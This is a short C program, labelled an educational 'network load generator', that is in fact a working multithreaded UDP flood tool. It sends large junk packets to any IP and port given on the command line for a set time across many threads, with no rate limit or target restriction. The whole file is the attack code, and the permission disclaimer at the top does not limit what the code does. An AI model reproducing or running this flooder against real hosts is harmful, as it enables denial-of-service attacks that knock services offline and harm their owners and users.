// Network Load Generator for Educational Purposes
// Only use on networks you own or have explicit permission to test.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

typedef struct {
    char ip[16];
        int port;
            int duration;
            } ThreadArgs;

            // Define thread function for sending packets
            void *flood(void *args) {
                ThreadArgs *threadArgs = (ThreadArgs *)args;

                    // Set up the socket
                        int sock = socket(AF_INET, SOCK_DGRAM, 0);
                            if (sock < 0) {
                                    perror("Socket error");
                                            pthread_exit(NULL);
                                                }

                                                    // Specify the target address
                                                        struct sockaddr_in targetAddr;
                                                            memset(&targetAddr, 0, sizeof(targetAddr));
                                                                targetAddr.sin_family = AF_INET;
                                                                    targetAddr.sin_port = htons(threadArgs->port);
                                                                        if (inet_pton(AF_INET, threadArgs->ip, &targetAddr.sin_addr) <= 0) {
                                                                                perror("Invalid IP address");
                                                                                        pthread_exit(NULL);
                                                                                            }

                                                                                                // Create a buffer for the packet data
                                                                                                    char data[2048];
                                                                                                        memset(data, 'X', sizeof(data));

                                                                                                            // Time tracking
                                                                                                                time_t start = time(NULL);
                                                                                                                    while (time(NULL) - start < threadArgs->duration) {
                                                                                                                            // Send packet
                                                                                                                                    if (sendto(sock, data, sizeof(data), 0, (struct sockaddr *)&targetAddr, sizeof(targetAddr)) < 0) {
                                                                                                                                                perror("Sendto error");
                                                                                                                                                        }
                                                                                                                                                            }

                                                                                                                                                                close(sock);
                                                                                                                                                                    pthread_exit(NULL);
                                                                                                                                                                    }

                                                                                                                                                                    int main(int argc, char **argv) {
                                                                                                                                                                        // Validate arguments
                                                                                                                                                                            if (argc != 5) {
                                                                                                                                                                                    printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
                                                                                                                                                                                            return 1;
                                                                                                                                                                                                }

                                                                                                                                                                                                    // Parse arguments
                                                                                                                                                                                                        char *ip = argv[1];
                                                                                                                                                                                                            int port = atoi(argv[2]);
                                                                                                                                                                                                                int timeDuration = atoi(argv[3]);
                                                                                                                                                                                                                    int threads = atoi(argv[4]);

                                                                                                                                                                                                                        if (port <= 0 || port > 65535 || timeDuration <= 0 || threads <= 0) {
                                                                                                                                                                                                                                printf("Invalid arguments. Please check the input.\n");
                                                                                                                                                                                                                                        return 1;
                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                printf("Starting traffic generation:\n");
                                                                                                                                                                                                                                                    printf("Target IP: %s\n", ip);
                                                                                                                                                                                                                                                        printf("Target Port: %d\n", port);
                                                                                                                                                                                                                                                            printf("Duration: %d seconds\n", timeDuration);
                                                                                                                                                                                                                                                                printf("Threads: %d\n", threads);

                                                                                                                                                                                                                                                                    // Set up thread arguments
                                                                                                                                                                                                                                                                        ThreadArgs args;
                                                                                                                                                                                                                                                                            strncpy(args.ip, ip, 16);
                                                                                                                                                                                                                                                                                args.port = port;
                                                                                                                                                                                                                                                                                    args.duration = timeDuration;

                                                                                                                                                                                                                                                                                        // Create threads
                                                                                                                                                                                                                                                                                            pthread_t threadPool[threads];
                                                                                                                                                                                                                                                                                                for (int i = 0; i < threads; i++) {
                                                                                                                                                                                                                                                                                                        if (pthread_create(&threadPool[i], NULL, flood, &args) != 0) {
                                                                                                                                                                                                                                                                                                                    perror("Thread creation failed");
                                                                                                                                                                                                                                                                                                                                return 1;
                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                                                                                                                // Wait for threads to finish
                                                                                                                                                                                                                                                                                                                                                    for (int i = 0; i < threads; i++) {
                                                                                                                                                                                                                                                                                                                                                            pthread_join(threadPool[i], NULL);
                                                                                                                                                                                                                                                                                                                                                                }

                                                                                                                                                                                                                                                                                                                                                                    printf("Traffic generation complete.\n");
                                                                                                                                                                                                                                                                                                                                                                        return 0;
                                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                                        